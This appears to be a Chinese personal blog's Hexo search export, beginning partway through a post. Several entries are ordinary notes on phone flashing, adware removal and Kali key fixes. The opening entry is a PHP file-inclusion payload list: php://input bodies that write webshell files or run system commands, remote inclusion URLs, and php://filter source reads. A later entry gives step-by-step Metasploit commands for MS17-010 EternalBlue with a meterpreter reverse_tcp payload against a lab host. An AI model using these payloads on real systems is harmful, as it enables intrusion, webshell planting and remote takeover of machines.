    <content type="text"><![CDATA[主要包含形式1.包含本地文件payload： ?page=C:\oneword ?file=C:\boot.ini（Windows查看系统版本） ?file=C:\WindowsSystem32inetsrvMetaBase.xml（Windows查看IIS配置文件) 2.包含远程文件payload： ?url=http://www.bbb.com/2.txt ?url=[http|https|ftp]://www.bbb.com/2.txt（可以有三种，http、https、ftp） 3.伪协议1) php://input 说明： 用来接收POST数据。我们能够通过input把我们的语句输入上去然后执行。 条件： php &lt;5.0 ，allow_url_include=Off 情况下也可以用 php &gt; 5.0，只有在allow_url_fopen=On 时才能使用 用例1 增加一句话： URL： http://localhost/include/file.php?file=php://input POST： &lt;?php fputs(fopen(&quot;shell.php&quot;,&quot;a&quot;),&quot;&lt;?php phpinfo();?&gt;&quot;) ?&gt; 用例2 增加文件： URL：http://localhost/include/file.php?file=php://inputPOST：&lt;?php fputs(fopen(&quot;oneword.php&quot;,&quot;w&quot;),&quot;&lt;?php phpinfo();?&gt;&quot;) ?&gt;这里fopen参数为w，可新建一个文件。 用例3 执行系统命令： URL：http://localhost/include/file.php?file=php://inputPOST：&lt;?php system(&#39;ipconfig&#39;);?&gt; 2)data:// 说明： 这是一种数据流封装器，data:URI schema(URL schema可以是很多形式) 利用data://伪协议进行代码执行的思路原理和php://是类似的，都是利用了PHP中的流的概念，将原本的include的文件流重定向到了用户可控制的输入流中 条件： allow_url_include=Onphp &gt; 5.2 3)php://filter 说明： 这个语句用来查看源码。直接包含php文件时会被解析，不能看到源码，所以用filter来读取，不过要先base64加密传输过来： ?page=php://filter/read=convert.base64-encode/resource=php.ini 访问上述URL后会返回config.php中经过Base64加密后的字符串，解密即可得到源码 payload: http://localhost/file.php?file=php://filter/read=convert.base64-encode/resource=file.php 资料来源：https://www.anquanke.com/post/id/86123]]></content>
  </entry>
  <entry>
    <title><![CDATA[打造手机渗透神器kali-linux-nethunter安装]]></title>
    <url>%2F2018%2F03%2F10%2F%E6%89%93%E9%80%A0%E6%89%8B%E6%9C%BA%E6%B8%97%E9%80%8F%E7%A5%9E%E5%99%A8kali-linux-nethunter%E5%AE%89%E8%A3%85%2F</url>
    <content type="text"><![CDATA[一加1（bacon） Kali Nethunter安装指南准备工作 准备一加一手机 解锁并刷到CM12并且开过一次机（我用魔趣也能成功，理论上来说任意6.0都行） 刷好TWRP recovery 官网下载刷机包 夜版（nightly） 刷机包本体： https://build.nethunter.com/nightly/2017.11-18-1618/nethunter-generic-armhf-kalifs-full-rolling-2017.11-18-1618.zip 内核： 6.0 https://build.nethunter.com/nightly/2017.11-18-1618/kernel-nethunter-oneplus1-marshmallow-2017.11-18-1618.zip 正式版（强烈推荐） 刷机包本体： https://build.nethunter.com/release/marshmallow/nethunter-oneplus1-marshmallow-kalifs-full-3.20-20170717-1810.zip 刷机 千万别双清，千万别双清，千万别双清（如果date被清了会刷写失败） 卡刷刷机包本体（正式版） （如果是夜版先刷内核再刷刷机包本体）]]></content>
      <categories>
        <category>kali</category>
      </categories>
      <tags>
        <tag>kali</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[记一次解决某网站高速下载病毒]]></title>
    <url>%2F2018%2F02%2F11%2F%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%A7%A3%E5%86%B3%E6%9F%90%E7%BD%91%E7%AB%99%E9%AB%98%E9%80%9F%E4%B8%8B%E8%BD%BD%E7%97%85%E6%AF%92%2F</url>
    <content type="text"><![CDATA[怒草流氓软件在某网站上下载软件，不小心用了高速下载，然后就被安装了流氓软件。天天开机弹广告，还不是启动项，通过进程删掉流氓软件后每次开机出现explorer.exe警告，在网上搜索后找到解决方案。 在注册表HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows里能找到和流氓软件对应地址的一个注册表项，删除此项，重启，问题解决。]]></content>
      <tags>
        <tag>病毒</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[kali更新源问题解决方案]]></title>
    <url>%2F2018%2F02%2F06%2Fkali%E6%9B%B4%E6%96%B0%E6%BA%90%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88%2F</url>
    <content type="text"><![CDATA[更换apt源后显示GPG错误 签名无效等问题描述Kali Linux由于太长时间未更新，而出现GPG错误 KEYEXPIRED 1425567400。经检查源未出现问题可以解析，deb也不冲突，就是密钥过期了! 解决方法具体更新方法有以下几种方法：（任选一种即可） 1、# apt-key adv --keyserver keys.gnupg.net --recv-keys ED444FF07D8D0BF6 2、# wget -q -O - archive.kali.org/archive-key.asc | apt-key add 3、# gpg --keyserver hkp://pgpkeys.mit.edu --recv-key ED444FF07D8D0BF6 # gpg -a --export ED444FF07D8D0BF6 | sudo apt-key add - 4、# wget https://http.kali.org/kali/pool/ ... ring_2018.1_all.deb # apt install ./kali-archive-keyring_2018.1_all.deb 成功更新密钥之后，我们就可以正常的 update / upgrade 了。 然后在执行1apt-get update 即可。]]></content>
      <categories>
        <category>kali</category>
      </categories>
      <tags>
        <tag>kali</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[瞎搞的一次ms17-0100漏洞利用]]></title>
    <url>%2F2018%2F01%2F18%2F%E7%9E%8E%E6%90%9E%E7%9A%84%E4%B8%80%E6%AC%A1ms17-0100%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%2F</url>
    <content type="text"><![CDATA[MS17-010前提条件：gem install ruby_smb—-ruby_smb模块安装msfupdate—-msf的更新msfconsole -qx “useexploit/windows/smb/ms17_010_eternalblue”—-启动并加载模块 部署环境： msfconsole wget https://raw.githubusercontent.com/backlion/metasploit-framework/master/modules/exploits/windows/smb/ms17_010_eternalblue.rb cp ms17_010_eternalblue.rb /usr/share/metasploit-framework/modules/exploits/windows/smb/ms17_010_eternalblue.rb 开始攻击: msfconsole use exploit/windows/smb/ms17_010_eternalblue set rhost 192.168.21.128 set lhost 192.168.21.131 set payload windows/x64/meterpreter/reverse_tcp exploit shell]]></content>
  </entry>
  <entry>
    <title><![CDATA[搭建个人博客]]></title>
    <url>%2F2018%2F01%2F16%2F%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%2F</url>
    <content type="text"><![CDATA[第一次尝试 2018/1/16经过两天的尝试，终于成功地在Github上面搭建了博客。]]></content>
  </entry>
  <entry>
    <title><![CDATA[Hello World]]></title>
    <url>%2F2018%2F01%2F15%2Fhello-world%2F</url>
    <content type="text"><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new "My New Post" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment]]></content>
  </entry>
</search>
